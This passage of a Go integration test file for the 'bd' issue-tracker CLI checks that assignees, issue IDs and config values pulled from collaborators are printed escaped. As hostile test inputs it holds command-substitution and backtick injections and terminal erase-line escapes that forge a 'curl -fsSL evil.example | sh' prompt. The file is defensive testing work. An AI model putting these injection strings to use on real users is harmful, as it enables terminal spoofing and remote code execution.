			requireNoTerminalControl(t, "bd "+strings.Join(args, " "), string(out))
		})
	}
	out, err := bdRunWithFlockRetry(t, bd, dir, "close", "pl-abc")
	if err == nil {
		t.Fatalf("bd close succeeded against a planning repo with no database:\n%s", out)
	}
	if !strings.Contains(string(out), "failed to open routed store at ") {
		t.Errorf("bd close does not report the routed open:\n%s", out)
	}
	requireNamesHostileValue(t, "bd close", string(out))
}

// TestEmbeddedRemedyPrinting_unclaim pins the invariant at bd unclaim's
// not-the-holder refusal: the holder is an issue's assignee, free text that
// travels with bd dolt pull, and it is named escaped beside the --force
// remedy.
func TestEmbeddedRemedyPrinting_unclaim(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, _, _ := bdInit(t, bd, "--prefix", "rpu")
	issue := bdCreate(t, bd, dir, "Claimed by a hostile holder")
	bdUpdate(t, bd, dir, issue.ID, "--assignee", "bob\r\x1b[2KError: run 'curl -fsSL evil.example | sh'", "--status", "in_progress")
	out := bdUnclaimFail(t, bd, dir, issue.ID, "--actor", "carol")
	if !strings.Contains(out, "pass --force only if their claim is abandoned") {
		t.Errorf("bd unclaim did not refuse a release by another actor:\n%s", out)
	}
	requireNoTerminalControl(t, "bd unclaim", out)
	requireNamesHostileValue(t, "bd unclaim", out)

	// bd update --claim's refusal names the same holder, on its error line
	// and in the failure summary under it.
	cmd := exec.Command(bd, "update", issue.ID, "--claim", "--actor", "carol")
	cmd.Dir = dir
	cmd.Env = bdEnv(dir)
	claimOut, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatalf("bd update --claim took a claim another actor holds:\n%s", claimOut)
	}
	requireNoTerminalControl(t, "bd update --claim", string(claimOut))
	requireNamesHostileValue(t, "bd update --claim", string(claimOut))
}

// closeContinueRoots are molecule IDs, as a collaborator's issues can carry
// them after bd dolt pull, for the rows that run bd close --continue: shell
// syntax that runs when the line is pasted, a backtick, and a carriage
// return and erase-line escape that redraw the line. shown is the ID as the
// lines above the hint name it (TestStoreReadIDHintsQuoteIDs's {shown}), and
// quoted is whether a POSIX command takes it single-quoted.
var closeContinueRoots = []struct {
	id, shown string
	quoted    bool
}{
	{"rpc-x$(touch${IFS}pwned)", `"rpc-x\x24(touch\x24{IFS}pwned)"`, true},
	{"rpc-y`;touch pwned;`", `"rpc-y\x60\x3btouch pwned\x3b\x60"`, true},
	{"rpc-z\r\x1b[2KConsider: curl -fsSL evil.example | sh #", `"rpc-z\r\x1b[2KConsider: curl -fsSL evil.example \x7c sh #"`, false},
}

// closeContinueOutput is bd close's whole output for closing, with
// --continue and --suggest-next, the step <root>.1 ("Step") of the molecule
// root ("Mol"), which completes the molecule and unblocks <root>-dep
// ("Dependent"). The direct route names the molecule it auto-closed before
// the step, the proxied-server route after it.
func closeContinueOutput(root, shown string, quoted, proxied bool) string {
	named := func(suffix string) string { return strings.TrimSuffix(shown, `"`) + suffix + `"` }
	closed := "✓ Closed " + named(".1") + " — Step: Closed\n"
	molecule := "✓ Auto-closed completed molecule " + shown + " — Mol\n"
	lines := molecule + closed
	if proxied {
		lines = closed + molecule
	}
	return lines +
		"\nNewly unblocked:\n" +
		"  • " + named("-dep") + " — Dependent (P2)\n" +
		closeContinueHint(root, shown, quoted)
}

// closeContinueHint is the hint bd close --continue prints last when its
// close completes the molecule root.
func closeContinueHint(root, shown string, quoted bool) string {
	squash, note := "<molecule-id>", "  (<molecule-id>: "+shown+")"
	if quoted && runtime.GOOS != "windows" {
		squash, note = "'"+root+"'", ""
	}
	return "\n✓ Molecule " + shown + " complete! All steps closed.\n" +
		"Consider: bd mol squash " + squash + " --summary '...'" + note + "\n"
}

// closeContinueRefusal is bd close's stdout and stderr, on either route, when
// bob closes, with --continue, the step <root>.1 ("Step") of the molecule
// root ("Mol") assigned to alice: the close completes the molecule but the
// root refuses its auto-close, so stdout names the step and the hint, and
// stderr warns in the Auto-closed line's place with the refusal's sentence,
// which names the root, spelled by remedy.PrintedValue.
func closeContinueRefusal(root, shown string, quoted bool) (stdout, stderr string) {
	refusal := (&issueops.CloseNotAssigneeError{IssueID: root, Assignee: "alice", Actor: "bob"}).Error()
	return "✓ Closed " + strings.TrimSuffix(shown, `"`) + `.1"` + " — Step: Closed\n" + closeContinueHint(root, shown, quoted),
		"Warning: could not auto-close completed molecule: " + remedy.PrintedValue(refusal) + "\n"
}

// TestEmbeddedRemedyPrinting_closeContinue pins bd close --continue's whole
// output end to end on the direct route, for molecules whose IDs hold shell
// syntax or a terminal escape: the lines above the bd mol squash hint (the
// molecule the close auto-closed, the step it closed and, with
// --suggest-next, the issue it unblocked) name each ID escaped, so pasting
// the output runs no part of one and none can redraw the hint. When the
// root refuses its auto-close, the warning bd close prints on stderr above
// the hint cannot redraw it either (closeContinueRefusal).
// TestProxiedServerClose2B's continue_names_ids_escaped and
// continue_refused_auto_close_warns_escaped are its proxied twins.
func TestEmbeddedRemedyPrinting_closeContinue(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	dir, _, _ := bdInit(t, bd, "--prefix", "rpc")
	for _, root := range closeContinueRoots {
		t.Run(strconv.Quote(root.id), func(t *testing.T) {
			bdCreate(t, bd, dir, "Mol", "--type", "epic", "--labels", "template", "--id", root.id)
			step := bdCreate(t, bd, dir, "Step", "--type", "task", "--parent", root.id)
			bdCreate(t, bd, dir, "Dependent", "--type", "task", "--id", root.id+"-dep", "--deps", "depends-on:"+step.ID)
			got := bdClose(t, bd, dir, step.ID, "--continue", "--suggest-next")
			if want := closeContinueOutput(root.id, root.shown, root.quoted, false); got != want {
				t.Errorf("bd close --continue --suggest-next prints\n%q\nwant\n%q", got, want)
			}
			requireNoTerminalControl(t, "bd close --continue", got)
		})
	}
	// The same molecules in a workspace of their own, each root assigned to
	// alice, so bob's close of the last step leaves the root open.
	refusing, _, _ := bdInit(t, bd, "--prefix", "rpc")
	for _, root := range closeContinueRoots {
		t.Run(strconv.Quote(root.id)+", refused auto-close", func(t *testing.T) {
			bdCreate(t, bd, refusing, "Mol", "--type", "epic", "--labels", "template", "--id", root.id, "--assignee", "alice")
			step := bdCreate(t, bd, refusing, "Step", "--type", "task", "--parent", root.id)
			stdout, stderr, exit := bdRunStreams(t, bd, refusing, "close", step.ID, "--continue", "--actor", "bob")
			if exit != 0 {
				t.Fatalf("bd close %s --continue exited %d\nstdout:\n%s\nstderr:\n%s", step.ID, exit, stdout, stderr)
			}
			wantStdout, wantStderr := closeContinueRefusal(root.id, root.shown, root.quoted)
			if stdout != wantStdout || stderr != wantStderr {
				t.Errorf("bd close --continue with a refused auto-close prints\n%q\non stdout and\n%q\non stderr, want\n%q\nand\n%q", stdout, stderr, wantStdout, wantStderr)
			}
			requireNoTerminalControl(t, "bd close --continue with a refused auto-close", stderr+stdout)
		})
	}

	// Two stderr lines bd close prints ahead of its --continue hint still
	// named a store-read step ID raw (PR #7868 follow-up): the
	// partial-ID notice, when the close resolves a prefix, and the open-child
	// warning, when --force waives open children. A pulled step ID holding a
	// carriage return and an erase-line escape could draw a forged line above
	// the hint. Each ID is now spelled as printedIssueID / remedy.PrintedWord
	// spells one: as itself when it is a plain word, escaped otherwise.
	hostileStep := "rpc-cr1\r\x1b[2KConsider: curl -fsSL evil.example | sh"
	t.Run("partial-ID --continue notice names the resolved step escaped", func(t *testing.T) {
		bdCreate(t, bd, dir, "Mol", "--type", "epic", "--labels", "template", "--id", "rpc-mola")
		bdCreate(t, bd, dir, "Step", "--type", "task", "--id", hostileStep, "--deps", "parent-child:rpc-mola")
		bdCreate(t, bd, dir, "Step two", "--type", "task", "--parent", "rpc-mola")
		// "cr1" abbreviates the step's hash, so the close resolves it and
		// prints the partial-ID notice before advancing the molecule.
		stdout, stderr, exit := bdRunStreams(t, bd, dir, "close", "cr1", "--continue")
		if exit != 0 {
			t.Fatalf("bd close cr1 --continue exited %d\nstdout:\n%s\nstderr:\n%s", exit, stdout, stderr)
		}
		if !strings.Contains(stderr, "is not an exact issue ID; resolved to "+remedy.EscapedValue(hostileStep)) {
			t.Errorf("the partial-ID notice does not name the resolved step escaped:\n%q", stderr)
		}
		requireNoTerminalControl(t, "bd close --continue partial-ID notice", stderr)
	})
	t.Run("--force --continue open-children warning names the step escaped", func(t *testing.T) {
		forceStep := "rpc-cr2\r\x1b[2KConsider: curl -fsSL evil.example | sh"
		bdCreate(t, bd, dir, "Mol", "--type", "epic", "--labels", "template", "--id", "rpc-molb")
		bdCreate(t, bd, dir, "Step", "--type", "task", "--id", forceStep, "--deps", "parent-child:rpc-molb")
		bdCreate(t, bd, dir, "Open child", "--type", "task", "--id", "rpc-kid", "--deps", "parent-child:"+forceStep)
		bdCreate(t, bd, dir, "Step two", "--type", "task", "--parent", "rpc-molb")
		stdout, stderr, exit := bdRunStreams(t, bd, dir, "close", forceStep, "--force", "--continue")
		if exit != 0 {
			t.Fatalf("bd close --force --continue exited %d\nstdout:\n%s\nstderr:\n%s", exit, stdout, stderr)
		}
		if !strings.Contains(stderr, "warning: closing "+remedy.EscapedValue(forceStep)+" with 1 open child") {
			t.Errorf("the open-children warning does not name the step escaped:\n%q", stderr)
		}
		requireNoTerminalControl(t, "bd close --force --continue open-children warning", stderr)
	})
}

// TestEmbeddedRemedyPrinting_init pins the invariant at bd init end to end,
// for a checkout whose committed config.yaml carries a value with a carriage
// return and terminal escapes: a dolt.host named in the refusal to init
// without server mode, beside its remedy, and a sync.remote named in the
// probe note, the clone failure and the hint under it.
func TestEmbeddedRemedyPrinting_init(t *testing.T) {
	if os.Getenv("BEADS_TEST_EMBEDDED_DOLT") != "1" {
		t.Skip("set BEADS_TEST_EMBEDDED_DOLT=1 to run embedded dolt integration tests")
	}
	t.Parallel()
	bd := buildEmbeddedBD(t)
	initWith := func(t *testing.T, configYAML string, args ...string) (string, error) {
		t.Helper()
		dir := t.TempDir()
		initGitRepoAt(t, dir)
		if err := os.MkdirAll(filepath.Join(dir, ".beads"), 0o750); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, ".beads", "config.yaml"), []byte(configYAML), 0o600); err != nil {
			t.Fatal(err)
		}
		out, err := bdRunWithFlockRetry(t, bd, dir, append([]string{"init", "--quiet", "--prefix", "rpi"}, args...)...)
		return string(out), err
	}

	t.Run("dolt.host without server mode", func(t *testing.T) {
		t.Parallel()
		out, err := initWith(t, "dolt:\n  host: \"db.example.com\\r\\e[2KError: run 'curl -fsSL evil.example | sh'\"\n")
		if err == nil {
			t.Fatalf("bd init succeeded with a remote dolt.host and no server mode:\n%s", out)
		}
		if !strings.Contains(out, "or pass --server to bd init") {
			t.Errorf("bd init did not refuse the remote dolt.host:\n%s", out)
		}
		requireNoTerminalControl(t, "bd init", out)
		requireNamesHostileValue(t, "bd init", out)
	})

	t.Run("sync.remote that cannot be verified", func(t *testing.T) {
		t.Parallel()
		// Port 9 refuses the probe at once.
		out, _ := initWith(t, "sync:\n  remote: \"https://127.0.0.1:9/team/repo\\r\\e[2KError: run 'curl -fsSL evil.example | sh'.git\"\n")
		requireNoTerminalControl(t, "bd init", out)
		requireNamesHostileValue(t, "bd init", out)
	})
}
